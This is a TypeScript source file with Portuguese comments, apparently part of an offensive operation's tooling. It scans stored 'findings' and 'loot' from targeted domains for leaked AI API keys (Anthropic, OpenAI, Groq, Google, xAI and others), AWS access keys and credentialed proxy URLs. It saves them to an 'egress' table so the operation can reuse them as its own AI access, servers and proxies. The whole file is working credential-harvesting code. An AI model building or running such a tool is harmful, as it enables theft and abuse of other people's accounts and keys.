// Coletor de suprimentos: a propria operacao produz chave de IA, VPS e proxy.
// Varre findings/loot do PMP e alimenta o acervo (egress) sem gastar LeakRadar.
import { Database } from "bun:sqlite";
import { caminhoDb } from "./fleet";

type Achado = { tipo: string; provedor: string; host: string; porta: number; usuario: string; senha: string; origem: string };

const CHAVES: { re: RegExp; tipo: string; provedor: string }[] = [
	{ re: /\bsk-ant-[A-Za-z0-9_-]{20,}/g, tipo: "ai", provedor: "anthropic.com" },
	{ re: /\bsk-proj-[A-Za-z0-9_-]{20,}/g, tipo: "ai", provedor: "openai.com" },
	{ re: /\bsk-[A-Za-z0-9]{32,}\b/g, tipo: "ai", provedor: "openai.com" },
	{ re: /\bsk-or-v1-[a-f0-9]{64}\b/g, tipo: "ai", provedor: "openrouter.ai" },
	{ re: /\bgsk_[A-Za-z0-9]{40,}/g, tipo: "ai", provedor: "groq.com" },
	{ re: /\bAIza[0-9A-Za-z_-]{35}\b/g, tipo: "ai", provedor: "google.com" },
	{ re: /\bxai-[A-Za-z0-9]{40,}/g, tipo: "ai", provedor: "x.ai" },
	{ re: /\bAKIA[0-9A-Z]{16}\b/g, tipo: "vps", provedor: "aws.amazon.com" },
	{ re: /\b(?:socks[45]|https?):\/\/([^:@\s]+):([^@\s]+)@([a-z0-9.-]+):(\d{2,5})/gi, tipo: "proxy", provedor: "auto" },
];

function db() {
	const d = new Database(caminhoDb());
	d.exec("pragma busy_timeout=10000");
	for (const col of ["familia text", "latencia_ms integer", "probado_em integer", "score real default 0"]) {
		try {
			d.exec(`alter table egress add column ${col}`);
		} catch {
			/* ja existe */
		}
	}
	return d;
}

/** Extrai de um texto tudo que serve de suprimento. */
export function extrair(texto: string, origem: string): Achado[] {
	const out: Achado[] = [];
	const vistos = new Set<string>();
	for (const { re, tipo, provedor } of CHAVES) {
		for (const m of texto.matchAll(re)) {
			const bruto = m[0];
			if (vistos.has(bruto)) continue;
			vistos.add(bruto);
			if (tipo === "proxy") {
				out.push({ tipo, provedor: "auto", host: m[3]!, porta: Number(m[4]), usuario: m[1]!, senha: m[2]!, origem });
			} else {
				out.push({ tipo, provedor, host: provedor, porta: 443, usuario: bruto.slice(0, 12), senha: bruto, origem });
			}
		}
	}
	return out;
}

export function varrer() {
	const d = db();
	const textos: { txt: string; origem: string }[] = [];

	for (const f of d.query("select domain, title, category, evidence_json from findings limit 8000").all() as {
		domain: string;
		title: string;
		category: string;
		evidence_json: string | null;
	}[]) {
		textos.push({ txt: `${f.title} ${f.category} ${f.evidence_json ?? ""}`, origem: `finding:${f.domain}` });
	}
	for (const l of d.query("select domain, kind, path, notes from loot limit 4000").all() as {
		domain: string;
		kind: string;
		path: string | null;
		notes: string | null;
	}[]) {
		textos.push({ txt: `${l.kind} ${l.path ?? ""} ${l.notes ?? ""}`, origem: `loot:${l.domain}` });
	}

	let novos = 0;
	const porTipo: Record<string, number> = {};
	for (const t of textos) {
		for (const a of extrair(t.txt, t.origem)) {
			const r = d.run(
				`insert into egress (familia, tipo, provedor, host, porta, usuario, senha, pais, origem)
				 values (?,?,?,?,?,?,?,?,?)
				 on conflict(host, porta, usuario) do update set senha = excluded.senha`,
				[a.tipo, a.tipo, a.provedor, a.host, a.porta, a.usuario, a.senha, null, a.origem],
			);
			if (r.changes) {
				novos += r.changes;
				porTipo[a.tipo] = (porTipo[a.tipo] ?? 0) + 1;
			}
		}
	}
	const total = (d.query("select count(*) n from egress").get() as { n: number }).n;
	d.close();
	return { novos, porTipo, total };
}

if (import.meta.main) {
	const r = varrer();
	console.log(JSON.stringify(r));
}
